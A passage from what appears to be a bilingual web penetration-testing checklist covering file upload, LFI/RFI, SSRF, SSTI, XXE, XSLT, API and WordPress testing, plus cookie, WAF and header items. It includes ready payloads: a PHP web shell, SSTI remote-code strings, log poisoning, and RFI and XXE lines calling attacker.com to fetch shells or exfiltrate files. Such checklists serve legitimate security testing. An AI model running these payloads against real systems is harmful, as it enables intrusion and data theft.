    - [ ] **Validación de Magic Bytes/File Signature:** Modificar los primeros bytes del archivo para que coincidan con un tipo permitido, pero con contenido malicioso.
- [ ] **Explotación:**
    - [ ] **Web Shells:** Subir archivos `.php`, `.asp`, `.aspx`, `.jsp`, etc., para RCE.
    - [ ] **XSS vía Archivos Subidos:**
        - [ ] Subir archivos `.html`, `.svg` con scripts.
        - [ ] Inyectar XSS en metadatos de imágenes (`exiftool -Comment='"><img src=1 onerror=alert(document.domain)>' imagen.jpg`) y asegurarse de que se sirva con `Content-Type: text/html` o que el navegador lo interprete como HTML.
    - [ ] **XXE vía Archivos Subidos:**
        - [ ] Subir archivos `.xml`, `.svg`, `.docx`, `.pdf` (si se procesan en el servidor) con payloads XXE.
        - [ ] Ejemplo SVG: `<?xml version="1.0" encoding="UTF-8"?><!DOCTYPE svg [ <!ENTITY xxe SYSTEM "file:///etc/passwd"> ]><svg>&xxe;</svg>`
        - [ ] Leer código fuente: `php://filter/convert.base64-encode/resource=index.php`.
    - [ ] **Ataques de Denegación de Servicio (DoS):**
        - [ ] Subir archivos muy grandes (Zip Bombs, Billion Laughs Attack para XML).
    - [ ] **Sobrescribir Archivos Existentes:** ¿Se puede subir un archivo con el mismo nombre que uno crítico (ej. `index.php`)?
    - [ ] **Path Traversal en Nombres de Archivo:** ¿Se puede usar `../../` en el nombre del archivo para escribir fuera del directorio de subida?
- [ ] **Inyección de Caracteres Especiales en Nombres de Archivo.**
- [ ] **Automatizar RCE (si se obtiene un webshell):** Usar scripts para interactuar con el shell.

### LFI/RFI

#### Local File Inclusion (LFI)

- [ ] **Identificar Parámetros Vulnerables:** Buscar parámetros como `?page=`, `?file=`, `?include=`, `?path=`, `?document=`.
- [ ] **Path Traversal:**
    - [ ] Intentar acceder a archivos fuera del directorio web raíz:
        - [ ] `../../../../../../../../etc/passwd`
        - [ ] `../../../../../../../../windows/win.ini`
    - [ ] **Bypass de Filtros:**
        - [ ] **Encodings:** `%2e%2e%2f`, `..%252f`, `.%2e/%2e%2e/`, `%c0%af` (overlong UTF-8), `..%c1%9c`.
        - [ ] **Filtros no recursivos:** `....//....//etc/passwd` (si `../` se reemplaza por nada).
        - [ ] **Paths aprobados/prefijos:** Si el path debe empezar con `/var/www/html/pages/`, intentar `?page=/var/www/html/pages/../../../../etc/passwd`.
        - [ ] **Extensiones añadidas automáticamente:**
            - [ ] **Null Byte:** `?page=../../etc/passwd%00` (si PHP < 5.3.4).
            - [ ] **Path Truncation:** Usar paths largos para que la extensión añadida se corte (ej. `?page=../../etc/passwd/././.[...]././.`).
- [ ] **Fuzzing de Parámetros y Archivos del Servidor:**
    - [ ] Usar wordlists para encontrar parámetros LFI comunes (GET y POST).
    - [ ] Usar wordlists de archivos comunes del servidor (logs, configuraciones, webroot).
- [ ] **PHP Filters & Wrappers:**
    - [ ] **`php://filter` para leer código fuente:**
        - [ ] `php://filter/read=convert.base64-encode/resource=index.php`
        - [ ] `php://filter/resource=index.php` (si se muestra directamente).
    - [ ] **`php://input` para RCE (POST request, `allow_url_include=on`):**
        - [ ] Enviar código PHP en el cuerpo del POST: `<?php system($_GET['cmd']); ?>`
    - [ ] **`expect://` para RCE (`expect` extensión habilitada):**
        - [ ] `expect://ls`
    - [ ] **`data://` para RCE (`allow_url_include=on`):**
        - [ ] `data://text/plain;base64,PD9waHAgc3lzdGVtKCRfR0VUWydjbWQnXSk7ID8+` (con `&cmd=ls`).
    - [ ] **Otros wrappers:** `zip://`, `phar://` (requiere un archivo subido).
    - [ ] **Fuzzing para archivos PHP** si se conoce la estructura.
    - [ ] **RCE directo con filtros (tu payload largo de `convert.iconv`):**
        - [ ] `php://filter/convert.iconv.../resource=php://temp&cmd=id` (probar si hay filtros muy específicos).
    - [ ] **`assert` (si se encuentra en el código y es inyectable):** `' and die(show_source('/etc/passwd')) or '`.
- [ ] **Técnicas LFI a RCE:**
    - [ ] **Log Poisoning:**
        - [ ] Inyectar código PHP en logs (ej. Apache `access.log` o `error.log` a través de peticiones con User-Agent malicioso o URLs malformadas).
        - [ ] `<?php system($_GET['cmd']); ?>`
        - [ ] Incluir el log: `?page=../../var/log/apache2/access.log&cmd=id`.
    - [ ] **`/proc/self/environ` (Linux):** Si se puede controlar una variable de entorno (ej. User-Agent) y se refleja en `/proc/self/environ`.
    - [ ] **Inclusión de Archivos de Sesión PHP:** Si se puede controlar parte del contenido de la sesión.
    - [ ] **Inclusión de Archivos Temporales de Upload:** Si se conoce la ruta y el nombre del archivo temporal.
- [ ] **Herramientas LFI:** LFISuite, LFiFreak, liffy, dotdotpwn.

#### Remote File Inclusion (RFI)

- [ ] **Verificar si es posible (requiere `allow_url_fopen=on` y `allow_url_include=on` en PHP).**
- [ ] **Explotación:**
    - [ ] Incluir un shell remoto: `?page=http://atacante.com/shell.txt` (donde shell.txt contiene código PHP).
    - [ ] Si se añade una extensión automáticamente (ej. `.php`):
        - [ ] Usar `?` o `#` en la URL remota: `?page=http://atacante.com/shell.txt?` o `?page=http://atacante.com/shell.txt%23`.
    - [ ] **Vía FTP/SMB:** `?page=ftp://user:pass@atacante.com/shell.txt`.
- [ ] **RFI también puede usarse para SSRF (enumerar puertos internos, etc.).**

### Ataques del Lado del Servidor

#### Server-Side Request Forgery (SSRF)

- [ ] **Descubrimiento e Identificación:**
    - [ ] Buscar funcionalidades que tomen URLs como entrada (webhooks, importadores de URL, conversores PDF, proxies internos).
    - [ ] Parámetros con nombres como `url`, `uri`, `link`, `image_url`, `dest`, `feed`.
    - [ ] Probar con URLs a un servidor controlado por el atacante (Burp Collaborator, `nc` listener).
    - [ ] Revisar si la aplicación hace peticiones a recursos externos (imágenes, APIs) que puedan ser manipuladas.
- [ ] **Explotación:**
    - [ ] **Acceso a Recursos Internos:**
        - [ ] `http://localhost/`, `http://127.0.0.1/`, `http://[::1]/`.
        - [ ] `http://169.254.169.254/` (metadatos de cloud: AWS, GCP, Azure).
        - [ ] Escanear puertos internos: `http://internal-host:port`.
        - [ ] Leer archivos locales usando `file:///` wrapper (ej. `file:///etc/passwd`, `file:///C:/windows/win.ini`).
    - [ ] **Bypass de Filtros SSRF:**
        - [ ] IPs en diferentes formatos: decimal (ej. `2130706433` para `127.0.0.1`), octal, hex.
        - [ ] Usar subdominios que resuelvan a IPs internas (DNS rebinding).
        - [ ] Usar redirecciones (3xx) a URLs internas.
        - [ ] Usar `@` en la URL: `http://expected-domain@internal-host`.
        - [ ] Encodings de URL.
    - [ ] **Crear Peticiones POST (Gopher, etc.):**
        - [ ] Usar el protocolo `gopher://` para enviar datos arbitrarios a servicios internos (ej. Redis, MySQL).
- [ ] **Blind SSRF:**
    - [ ] No se ve la respuesta directa, pero la petición se realiza.
    - [ ] Detectar con interacciones OOB (DNS, HTTP a servidor del atacante).
    - [ ] Exfiltrar datos mediante errores o retardos.
    - [ ] Usar scripts HTML/JS para forzar al servidor a hacer peticiones.
- [ ] **Time-Based SSRF:** Si se puede inducir un retardo basado en la respuesta de un servicio interno.
- [ ] **AJP Proxy (Relacionado con SSRF/Configuración Incorrecta):**
    - [ ] Si el puerto `8009/tcp` (AJP) está expuesto y mal configurado (ej. Ghostcat - CVE-2020-1938).
    - [ ] Intentar leer archivos o ejecutar código.

#### Server-Side Includes (SSI) Injection

- [ ] **Identificación:**
    - [ ] Buscar páginas con extensiones `.shtml`, `.shtm`, `.stm`.
    - [ ] Inyectar directivas SSI en campos de entrada que se reflejen en la página:
        - [ ] ``
        - [ ] ``
        - [ ] `` (Linux)
        - [ ] `` (Windows)
- [ ] **Explotación:**
    - [ ] Ejecutar comandos del OS.
    - [ ] Leer archivos (`` o `file="key.txt"`).
    - [ ] Obtener información del servidor.

#### Edge Side Includes (ESI) Injection

- [ ] **Identificación:**
    - [ ] Buscar cabeceras como `Surrogate-Control`, `X-ESI-Enabled`, `Edge-Control`.
    - [ ] Inyectar tags ESI en puntos de entrada reflejados:
        - [ ] `<esi:include src="http://attacker.com/"/>` (para SSRF o XSS).
        - [ ] `<esi:vars>$(HTTP_COOKIE)</esi:vars>` (para exfiltrar cookies, incluyendo HttpOnly).
        - [ ] `<esi:comment text="TEST"/>`
- [ ] **Explotación:**
    - [ ] XSS, CSRF.
    - [ ] Robo de cookies (incluyendo HttpOnly).
    - [ ] SSRF.
    - [ ] DoS.

#### Server-Side Template Injection (SSTI)

- [ ] **Identificación:**
    - [ ] Buscar parámetros que se reflejen en la página, especialmente si usan plantillas (ej. personalización de emails, mensajes de error).
    - [ ] Probar payloads de plantilla comunes:
        - [ ] `{7*7}` (Jinja2, Twig) -> `49`
        - [ ] `${7*7}` (FreeMarker, Velocity) -> `49`
        - [ ] `{{7*'7'}}` (Jinja2, si * es concatenación) -> `7777777`
        - [ ] `#{7*7}` (Jade/Pug) -> `49`
        - [ ] `%{7*7}`
        - [ ] Si hay un error, puede revelar el motor de plantillas.
    - [ ] Usar un diagrama de flujo para identificar el motor (ej. el de PortSwigger).
- [ ] **Explotación (varía según el motor):**
    - [ ] **Jinja2 (Python):**
        - [ ] Acceder al objeto `request` o `config`.
        - [ ] `{{ config }}`
        - [ ] RCE: `{{ self.__init__.__globals__.__builtins__.__import__('os').popen('id').read() }}`
        - [ ] `{{ ''.__class__.__mro__[1].__subclasses__()[<index_de_os._wrap_close>].__init__.__globals__['popen']('id').read() }}` (buscar el índice correcto)
    - [ ] **Twig (PHP):**
        - [ ] Info Disclosure: `{{_self.env.display("index.html")}}`
        - [ ] LFI: `{{_self.env.registerUndefinedFilterCallback("exec")}}{{_self.env.getFilter("id") }}` (luego usar `{{ "id"|id }}`)
        - [ ] RCE: `{{_self.env.registerUndefinedFilterCallback("exec")}}{{_self.env.getFilter("id") }}` y luego `{{ "cat /etc/passwd"|id }}` (si `exec` está permitido).
    - [ ] **FreeMarker (Java):**
        - [ ] RCE: `<#assign ex="freemarker.template.utility.Execute"?new()>${ ex("id") }`
    - [ ] **Velocity (Java):**
        - [ ] RCE: `#set($x="");#set($rt=$x.class.forName("java.lang.Runtime"));#set($cr=$rt.getRuntime());$cr.exec("id")`
- [ ] **Herramientas Automatizadas:** Tplmap (`tplmap -u <URL_con_param_vulnerable>`).

#### XML External Entity (XXE) Injection

- [ ] **Identificación:**
    - [ ] Buscar funcionalidades que procesen XML (uploads de XML/SOAP, APIs que acepten XML, RSS feeds).
    - [ ] Verificar si se puede controlar la `DOCTYPE` o si se parsean entidades.
    - [ ] Enviar un payload simple para ver si se procesa:
       
        ```
        <?xml version="1.0" encoding="UTF-8"?>
        <!DOCTYPE foo [ <!ENTITY xxe "TEST_XXE"> ]>
        <data>&xxe;</data>
        ```
- [ ] **Explotación:**
    - [ ] **Local File Disclosure:**
        - [ ] `<!ENTITY xxe SYSTEM "file:///etc/passwd">`
        - [ ] `<!ENTITY xxe SYSTEM "file:///c:/windows/win.ini">`
    - [ ] **Lectura de Código Fuente (PHP):**
        - [ ] `<!ENTITY xxe SYSTEM "php://filter/convert.base64-encode/resource=index.php">`
    - [ ] **SSRF:**
        - [ ] `<!ENTITY xxe SYSTEM "http://internal-server/secret">`
        - [ ] Escanear puertos internos: `<!ENTITY xxe SYSTEM "http://localhost:8080">`
    - [ ] **Denial of Service (DoS):**
        - [ ] Billion Laughs Attack: `<!ENTITY lol9 "&lol8;&lol8;...">`
        - [ ] Referenciar `/dev/random` o archivos muy grandes.
    - [ ] **Error-Based XXE (Out-of-Band):**
        - [ ] Si no se ve la salida directa, forzar errores que exfiltren datos a un DTD externo controlado.
        - [ ] `<!ENTITY % file SYSTEM "file:///etc/passwd">`
        - [ ] `<!ENTITY % eval "<!ENTITY &#x25; exfiltrate SYSTEM 'http://attacker.com/?data=%file;'>">`
        - [ ] `%eval; %exfiltrate;`
    - [ ] **Blind XXE / CDATA:** Usar técnicas OOB o errores para exfiltrar datos.
- [ ] **XXE en Content-Types comunes:** `application/xml`, `text/xml`, a veces en `application/json` si el parser lo maneja como XML.

#### XSLT Injection

- [ ] **Identificación:**
    - [ ] Funcionalidades que transformen XML usando XSLT (ej. generación de reportes, conversión de XML a HTML/PDF).
    - [ ] Si se puede subir un archivo XSL o controlar parte de la transformación XSL.
    - [ ] Provocar un error inyectando un tag XML roto (`<:`) en un campo que pueda ser parte de un XML procesado por XSLT.
- [ ] **Explotación (si se puede controlar el XSLT):**
    - [ ] **Information Disclosure (Propiedades del sistema XSLT):**

        ```
        <xsl:value-of select="system-property('xsl:version')" />
        <xsl:value-of select="system-property('xsl:vendor')" />
        ```
        
    - [ ] **Local File Inclusion:**
        - [ ] XSLT 2.0+: `unparsed-text('/etc/passwd', 'utf-8')`
        - [ ] Si soporta extensiones PHP: `php:function('file_get_contents','/etc/passwd')`
        - [ ] Payload:

            ```
            <xsl:stylesheet version="1.0" xmlns:xsl="http://www.w3.org/1999/XSL/Transform">
              <xsl:template match="/">
                <xsl:value-of select="unparsed-text('/etc/passwd', 'utf-8')"/>
              </xsl:template>
            </xsl:stylesheet>
            ```
            
    - [ ] **Remote Code Execution (si soporta extensiones PHP):**
        - [ ] `php:function('system','id')`
    - [ ] **SSRF:**
        - [ ] `xsl:include href="http://internal-server/"`
        - [ ] `document('http://internal-server/')`
    - [ ] **Fuzzing de funcionalidades XSLT:** Usar wordlists de funciones/elementos XSLT.

### Pruebas de API y Servicios Web

#### Descubrimiento e Identificación de APIs

- [ ] **Buscar Endpoints de API:**
    - [ ] Crawling, análisis de JS, `robots.txt`, `sitemap.xml`.
    - [ ] Patrones comunes: `/api/`, `/v1/`, `/rest/`, `/graphql`.
    - [ ] Fuzzing de directorios y archivos con wordlists de API (ej. `SecLists/Discovery/Web-Content/common-api-endpoints-mazen160.txt`).
        - [ ] `ffuf -w <api_wordlist> -u http://<IP_o_dominio>/api/FUZZ` (ajustar path base).
- [ ] **Web Services Description Language (WSDL) para SOAP:**
    - [ ] Buscar archivos WSDL: `?wsdl`, `/service.wsdl`, `/services/`, `/disco` (Microsoft DISCO).
    - [ ] `dirb http://<IP>:3002` (ejemplo de tu input).
    - [ ] `ffuf -w <params_wordlist> -u 'http://<IP>:3002/wsdl?FUZZ' -fs 0 -mc 200` (ejemplo de tu input).
    - [ ] Analizar el WSDL (con SoapUI, Wsdler, o manualmente) para entender operaciones, tipos de datos, y endpoints.
- [ ] **GraphQL:**
    - [ ] Endpoint común: `/graphql` o `/graphiql`.
    - [ ] Verificar si la Introspección está habilitada (permite consultar el schema).

#### Pruebas de Autenticación y Autorización en APIs

- [ ] **Mecanismos de Autenticación:**
    - [ ] ¿Tokens API (API Keys)? ¿En cabeceras (`Authorization: Bearer <token>`, `X-API-Key`), parámetros URL, cuerpo?
    - [ ] ¿OAuth 2.0? ¿Implementación correcta de flujos?
    - [ ] ¿JWT? Validar firma, algoritmos (`none`), información sensible en payload.
    - [ ] ¿Autenticación Básica?
- [ ] **Broken Object Level Authorization (BOLA / IDOR en APIs):**
    - [ ] Similar a IDOR web: ¿Se puede acceder/modificar objetos de otros usuarios cambiando IDs en la URL o cuerpo de la petición? (API1:2023)
- [ ] **Broken Function Level Authorization (BFLA):**
    - [ ] ¿Se puede acceder a funciones de administrador siendo un usuario normal, o viceversa? (API5:2023)
    - [ ] Probar diferentes métodos HTTP en endpoints (ej. DELETE en un endpoint que solo debería permitir GET).

#### Pruebas de Inyección en APIs

- [ ] **SQL Injection:** En parámetros URL, cuerpo JSON/XML.
- [ ] **NoSQL Injection:** Si usa MongoDB, etc.
- [ ] **Command Injection:** En parámetros que puedan ser usados en comandos del sistema.
- [ ] **XXE Injection:** Si la API acepta XML (SOAP, o REST con XML).
- [ ] **SSTI:** Si la API genera respuestas a partir de plantillas basadas en la entrada.

#### Exposición Excesiva de Datos

- [ ] ¿Las respuestas de la API devuelven más información de la necesaria para la funcionalidad del cliente? (API3:2023)
- [ ] Filtrar campos no necesarios en el cliente no es una solución.

#### Falta de Recursos y Rate Limiting

- [ ] ¿Ausencia de Rate Limiting en endpoints sensibles (login, APIs costosas)?
- [ ] ¿Se puede causar DoS con peticiones masivas?

#### Asignación Masiva (Mass Assignment)

- [ ] ¿Se pueden modificar campos de objetos internos que no deberían ser accesibles (ej. rol de usuario) enviándolos en la petición JSON/XML? 

#### Mala Configuración de Seguridad

- [ ] Cabeceras de seguridad faltantes (HSTS, CSP, etc.).
- [ ] CORS mal configurado (`Access-Control-Allow-Origin: *` o reflejando el origen).
- [ ] Información de versión expuesta.
- [ ] Endpoints de depuración accesibles.

#### Gestión Incorrecta de Activos

- [ ] APIs antiguas u obsoletas aún expuestas sin parches. 
- [ ] APIs de prueba/desarrollo expuestas en producción.

#### Consumo Inseguro de APIs
- [ ] Si la API consume otras APIs o URLs, ¿es vulnerable a SSRF?

#### Ataques Específicos de API

- [ ] **Information Disclosure (con posible SQLi):**
    - [ ] Fuzzing de parámetros: `ffuf -w <params_wordlist> -u 'http://<API_ENDPOINT>/?FUZZ=test_value'`
    - [ ] Si se encuentra un parámetro `id`, probar enumeración y SQLi.
    - [ ] Intentar bypassear rate limits (ej. `X-Forwarded-For`).
- [ ] **Arbitrary File Upload API:**
    - [ ] Similar a File Upload web, pero a través de un endpoint de API.
    - [ ] Intentar subir web shells.
- [ ] **Local File Inclusion API:**
    - [ ] Fuzzing de endpoints si `/api` responde `UP` pero no hay directorios conocidos: `ffuf -w <api_endpoints_wordlist> -u 'http://<API_IP>:3000/api/FUZZ'`
    - [ ] Aplicar técnicas LFI estándar.
- [ ] **Cross-Site Scripting API:**
    - [ ] Si un endpoint de API refleja la entrada en la respuesta (ej. JSON que luego se renderiza en HTML).
    - [ ] Probar payloads XSS (URL encoded si es necesario).
- [ ] **Server-Side Request Forgery API:**
    - [ ] Fuzzing de endpoints y parámetros.
    - [ ] Si se encuentra un parámetro vulnerable, probar SSRF (callback a servidor atacante, `file:///`, etc.).
    - [ ] Probar con payload en Base64.
- [ ] **Regular Expression Denial of Service (ReDoS) API:**
    - [ ] Si la API usa regex para validar entradas.
    - [ ] Enviar payloads diseñados para causar "catastrophic backtracking" en la regex.
    - [ ] Ejemplo: `email=aaaaaaaaaaaaaaaaaaaaaaaaaaaa@bbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbb!` (si la regex es ineficiente).
- [ ] **XML External Entity (XXE) Injection API:** (Ya cubierto en inyecciones generales).

#### SOAP Spoofing

- [ ] **SOAPAction Spoofing:** ¿Se pueden llamar acciones no previstas o eludir controles cambiando el `SOAPAction` header?
- [ ] **Command Injection en parámetros SOAP.**
- [ ] **Wordpress `xmlrpc.php` (si aplica):**
    - [ ] Enumerar métodos (`system.listMethods`).
    - [ ] Ataques de fuerza bruta de credenciales (`wp.getUsersBlogs`).
    - [ ] DoS (amplificación de pingbacks).
    - [ ] (WPScan puede automatizar algunos de estos tests).

### Wordpres

#### Estructura y Archivos Clave de WordPress

- [ ] **Archivos Raíz:** `index.php`, `license.txt` (versión), `readme.html` (versión), `wp-config.php` (crítico), `wp-admin/` (login), `wp-login.php`, `xmlrpc.php`.
- [ ] **`wp-config.php`:**
    - [ ] Intentar accederlo directamente (ej. si hay LFI o misconfig del servidor).
    - [ ] Contiene credenciales DB, sales, prefijo de tabla, `WP_DEBUG`.
- [ ] **Directorios Clave:**
    - [ ] `wp-content/`: `plugins/`, `themes/`, `uploads/` (permisos, listado de directorios).
    - [ ] `wp-includes/`: Archivos core.
- [ ] **Roles de Usuario:** Entender los roles (Administrator, Editor, Author, Contributor, Subscriber).

#### Enumeración de WordPress

- [ ] **Versión de WordPress Core:**
    - [ ] Código fuente: `meta name="generator"` tag.
    - [ ] CSS/JS encolados: `?ver=X.Y.Z`.
    - [ ] `readme.html`.
    - [ ] `license.txt`.
    - [ ] `wpscan --url <URL> --enumerate v` (versión).
- [ ] **Plugins y Temas:**
    - [ ] Código fuente (rutas a CSS/JS).
    - [ ] `wpscan --url <URL> --enumerate p` (plugins populares), `ap` (todos los plugins), `vp` (plugins vulnerables).
    - [ ] `wpscan --url <URL> --enumerate t` (temas), `at` (todos los temas), `vt` (temas vulnerables).
- [ ] **Listado de Directorios:**
    - [ ] ¿Habilitado en `wp-content/uploads/`, `wp-content/plugins/`, `wp-content/themes/`?
- [ ] **Enumeración de Usuarios:**
    - [ ] Desde el login (`/wp-login.php`): ¿Respuestas diferentes para usuarios válidos/inválidos?
    - [ ] `/author-sitemap.xml` o `/?author=<id>` (iterar IDs desde 1).
    - [ ] `wpscan --url <URL> --enumerate u` (usuarios).
- [ ] **XML-RPC:**
    - [ ] ¿`xmlrpc.php` habilitado?
    - [ ] `wpscan --url <URL> --enumerate x` (si xmlrpc está habilitado).

#### Ataques a WordPress

- [ ] **Ataques de Login / Fuerza Bruta:**
    - [ ] Usar `wpscan --url <URL> --passwords <pass_list> --usernames <user_list_o_usuario>`.
    - [ ] Usar Hydra o Burp Intruder contra `wp-login.php`.
- [ ] **Vulnerabilidades Conocidas:**
    - [ ] Buscar exploits para la versión de Core, plugins y temas identificados (Exploit-DB, Vulners, etc.).
    - [ ] WPScan lo hace automáticamente (`--plugins-detection aggressive --plugins-version-detection aggressive`).
- [ ] **Remote Code Execution (RCE) vía Editor de Temas/Plugins:**
    - [ ] Si se obtiene acceso como administrador, ¿se puede editar el código PHP de temas/plugins para insertar un web shell?
    - [ ] (Apariencia > Editor de Temas o Plugins > Editor de Plugins).
- [ ] **File Upload Vulnerabilities en Plugins/Temas.**
- [ ] **XSS, SQLi en Plugins/Temas.**


# Web-PenTest-Checklist INTEGRAR

## Cookie Settings

- [ ] **Insecure transmission:** Ensure cookies are sent only over HTTPS connections, to prevent interception by attackers. Set the "Secure" attribute for all cookies.

- [ ] **Missing HttpOnly attribute:** Set the "HttpOnly" attribute to ensure cookies are inaccessible to client-side scripts, reducing the risk of cross-site scripting (XSS) attacks.

- [ ] **Missing SameSite attribute:** Set the "SameSite" attribute to "Strict" or "Lax" to prevent cross-site request forgery (CSRF) attacks by ensuring cookies are only sent with requests originating from the same domain.

- [ ] **Excessive cookie lifetime:** Limit the duration of cookie validity by setting the "Expires" or "Max-Age" attribute. Long-lived cookies pose a greater risk if they are compromised.

- [ ] **Weak encryption:** Use strong encryption algorithms and up-to-date cryptographic libraries to protect sensitive information stored in cookies.

- [ ] **Insufficiently random session IDs:** Ensure session IDs are generated using a strong source of randomness, to prevent session hijacking and guessing attacks.

- [ ] **Overly permissive cookie domain and path:** Limit the scope of cookies by setting the "Domain" and "Path" attributes to specific subdomains or directories, reducing the risk of unauthorized access.

- [ ] **Storing sensitive information in cookies:** Avoid storing sensitive information, such as passwords, API keys, or personally identifiable information (PII) in cookies. Instead, store them server-side and use session IDs to reference the data.

- [ ] **Unprotected cookie values:** Ensure that cookie values are hashed, encrypted, or signed to protect them from being tampered with by attackers.

- [ ] **Inadequate monitoring and logging:** Implement a proper monitoring and logging system to track cookie usage, to help detect and respond to potential security incidents.

## SSRF

- [ ] **Test user-controlled URLs:** Identify user-controlled URL inputs and test them with external URLs to see if the server fetches or processes them.

- [ ] **Test internal IP addresses:** Attempt to access internal IP addresses (e.g., 127.0.0.1 or 10.0.0.0/8) or services through user-controlled inputs to check if the server processes them.

- [ ] **Use URL schemas:** Test various URL schemas, such as file://, ftp://, or gopher://, to bypass input validation or access internal resources.

- [ ] **Test domain resolution:** Test if your server resolves domain names to internal IP addresses by using a domain that points to an internal IP address.

- [ ] **Test URL redirection:** Test if the server follows redirects by supplying a URL that redirects to an internal or external resource.

- [ ] **Test with different HTTP methods:** Test SSRF vulnerabilities with various HTTP methods, such as GET, POST, PUT, DELETE, or HEAD.

- [ ] **Test with malformed URLs:** Test with malformed URLs that may bypass input validation, such as using @ to separate credentials or adding extra slashes.

- [ ] **Test for open ports:** Attempt to access open ports on the server or internal network by specifying the target IP and port in the URL.

- [ ] **Test for Out-of-Band (OOB) data exfiltration:** Test if the server can send data to an external domain you control, which may indicate an SSRF vulnerability.

- [ ] **Test for cloud service metadata:** If your site is hosted on a cloud provider, test if the server can access cloud service metadata endpoints, which may expose sensitive information.

- [ ] **Test with time-based techniques:** Use time-based techniques, such as delays or timeouts, to confirm SSRF vulnerabilities when the server response doesn't reveal the fetched content.

- [ ] **Test for protocol smuggling:** Test for protocol smuggling, such as using http:// within an https:// URL, to bypass input validation or access internal resources.

- [ ] **Test for bypassing URL filtering:** Attempt to bypass URL filtering using techniques like URL encoding, double encoding, or mixed case encoding.

- [ ] **Use web application scanners:** Use automated web application scanners, such as Burp Suite or OWASP ZAP, to identify potential SSRF vulnerabilities.

- [ ] **Test with IPv6 addresses:** Test for SSRF vulnerabilities using IPv6 addresses to bypass input validation or access internal resources.

## WAF Testing

- [ ] **Test with OWASP Top Ten attacks:** Test for the most common web application vulnerabilities, such as SQLi, XSS, CSRF, and RCE.

- [ ] **Use WAF testing tools:** Utilize tools like Wafw00f, Nmap, or WAPT to identify and test your WAF's capabilities.

- [ ] **Test for HTTP methods:** Test different HTTP methods (GET, POST, PUT, DELETE, etc.) to check if your WAF is properly filtering and blocking malicious requests.

- [ ] **Test for HTTP protocol violations:** Send requests that violate the HTTP protocol to see if your WAF can detect and block them.

- [ ] **Test with malformed requests:** Send malformed requests with invalid or unexpected characters, encoding, or headers to test if your WAF can detect and block them.

- [ ] **Test for evasion techniques:** Test various evasion techniques, such as URL encoding, double encoding, or using mixed case, to bypass input filters and WAF rules.

- [ ] **Test for IP and user agent blocking:** Test if your WAF can block specific IPs or user agents, and check for bypass techniques using proxies or fake user agents.

- [ ] **Test for rate limiting:** Test if your WAF can enforce rate limiting and block requests that exceed the allowed rate.

- [ ] **Test for cookie security:** Test if your WAF can detect and block cookie manipulation, such as injecting malicious code or altering session cookies.

- [ ] **Test for file upload vulnerabilities:** Test if your WAF can detect and block malicious file uploads, such as uploading web shells or malware.

- [ ] **Test for known attack signatures:** Test your WAF's ability to detect and block known attack signatures using tools like Burp Suite or OWASP ZAP.

- [ ] **Test custom WAF rules:** Test custom WAF rules and configurations to ensure they properly block malicious requests.

- [ ] **Test for false positives:** Ensure your WAF doesn't block legitimate traffic by testing with common requests and inputs that may trigger false positives.

- [ ] **Test for false negatives:** Ensure your WAF doesn't allow malicious traffic by testing with known attack vectors that should trigger blocking.

- [ ] **Test for SSL/TLS vulnerabilities:** Test if your WAF can detect and block SSL/TLS vulnerabilities, such as POODLE or Heartbleed.

- [ ] **Test for XML vulnerabilities:** Test if your WAF can detect and block XML-based attacks, such as XXE or XEE.

- [ ] **Test for header injection:** Test if your WAF can detect and block header injection attacks, such as CRLF injection or response splitting.

- [ ] **Test for path traversal attacks:** Test if your WAF can detect and block path traversal attacks, such as directory traversal or file inclusion.

- [ ] **Test for application-layer DDoS attacks:** Test if your WAF can detect and block application-layer DDoS attacks, such as Slowloris or RUDY.

- [ ] **Perform continuous testing and monitoring:** Regularly test your WAF's effectiveness and monitor its logs to detect and block new attack vectors and emerging threats.

## Header Vulnerability

- [ ] **Missing Strict-Transport-Security (HSTS) header:** Enables HTTPS-only communication, preventing man-in-the-middle attacks.

- [ ] **Missing X-Content-Type-Options header:** Disables MIME type sniffing, reducing the risk of attacks using MIME confusion.

- [ ] **Missing X-Frame-Options header:** Prevents clickjacking attacks by disallowing or limiting the site from being embedded within frames.

- [ ] **Missing Content-Security-Policy (CSP) header:** Defines allowed sources of content, reducing the risk of cross-site scripting (XSS) and content injection attacks.

- [ ] **Missing X-XSS-Protection header:** Activates built-in browser protection against cross-site scripting (XSS) attacks.

- [ ] **Missing Referrer-Policy header:** Controls the information sent in the Referer header, protecting user privacy and reducing the risk of information leakage.

- [ ] **Missing Feature-Policy header:** Restricts the use of certain browser features and APIs, improving security and privacy.

- [ ] **Insecure CORS (Cross-Origin Resource Sharing) settings:** Allows unauthorized domains to access resources, increasing the risk of cross-site request forgery (CSRF) and data leakage.

- [ ] **Missing Expect-CT header:** Enforces Certificate Transparency, reducing the risk of misissued SSL/TLS certificates.

- [ ] **Missing Permissions-Policy header:** Defines which browser features are allowed or denied, enhancing user privacy and security.

- [ ] **Weak or missing Public-Key-Pins (HPKP) header:** Ensures the use of specific cryptographic public keys, reducing the risk of man-in-the-middle attacks using rogue certificates.

- [ ] **Missing X-Download-Options header:** Prevents file download prompts from being displayed, reducing the risk of drive-by download attacks.

- [ ] **Missing X-Permitted-Cross-Domain-Policies header:** Restricts the loading of content from other domains, reducing the risk of data theft.

- [ ] **Missing X-DNS-Prefetch-Control header:** Controls DNS prefetching, potentially improving user privacy.

- [ ] **Inadequate Cache-Control settings:** Insecure caching settings can expose sensitive information or allow unauthorized access to content.

- [ ] **Missing X-Content-Duration header:** Helps prevent unauthorized media access by specifying the duration of media files.

- [ ] **Missing Access-Control-Allow-Origin header:** Improper configuration can result in unauthorized cross-origin resource sharing.

- [ ] **Missing X-WebKit-CSP header:** This older header is used by some legacy browsers for content security policy enforcement.

- [ ] **Missing X-Content-Security-Policy header:** Similar to X-WebKit-CSP, this older header is used by some legacy browsers for content security policy enforcement.

- [ ] **Missing X-XContent-Type-Options header:** Disables MIME sniffing on older browsers, reducing the risk of MIME confusion attacks.

- [ ] **Insecure ETag settings:** Weak ETag settings can cause caching issues, potentially exposing sensitive information.

- [ ] **Missing or weak Content-Encoding header:** Properly configuring this header helps protect against attacks that rely on manipulating content encoding.

- [ ] **Missing or weak Content-Language header:** Properly configuring this header helps protect against attacks that rely on manipulating content language.

- [ ] **Missing or weak Last-Modified header:** Properly configuring this header helps protect against attacks that rely on manipulating content modification timestamps.

- [ ] **Insecure or missing Cookie headers:** As mentioned in the previous answer, insecure cookie settings can lead to various security vulnerabilities.

## SQL Injection

- [ ] **Single quote test:** Inject a single quote ' into input fields and observe if it generates an error or unexpected behavior, which might indicate a potential SQLi vulnerability.

